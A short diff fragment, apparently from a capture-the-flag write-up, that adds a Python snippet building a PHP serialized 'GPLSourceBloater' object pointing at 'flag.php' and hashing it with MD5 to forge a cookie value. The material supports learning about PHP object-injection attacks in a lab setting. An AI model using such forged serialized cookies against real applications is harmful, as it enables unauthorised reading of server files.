@@ -75,6 +75,11 @@ O:16:"GPLSourceBloater" → PHP object
 s:6:"source" → set $this->source = "flag.php"
 ```
 
+```python
+import hashlib
+s = 'a:1:{i:0;O:16:"GPLSourceBloater":1:{s:6:"source";s:8:"flag.php";}}'
+print(hashlib.md5(s.encode()).hexdigest())
+```
 MD5: `760463360e4919ca238d1566fc26661f`
 
 Final Cookie Value (concatenated): 
